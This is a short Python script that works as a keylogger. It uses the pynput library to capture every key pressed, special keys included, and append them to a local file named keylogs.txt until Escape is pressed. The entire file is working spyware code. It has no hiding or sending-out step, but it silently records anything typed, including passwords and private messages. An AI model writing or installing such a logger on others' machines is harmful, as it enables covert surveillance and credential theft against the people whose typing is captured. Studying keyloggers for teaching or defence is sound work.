
from pynput import keyboard # type: ignore

# Specify the file where the logs will be saved
log_file = "keylogs.txt"

def on_press(key):
    try:
        # Log the character pressed
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
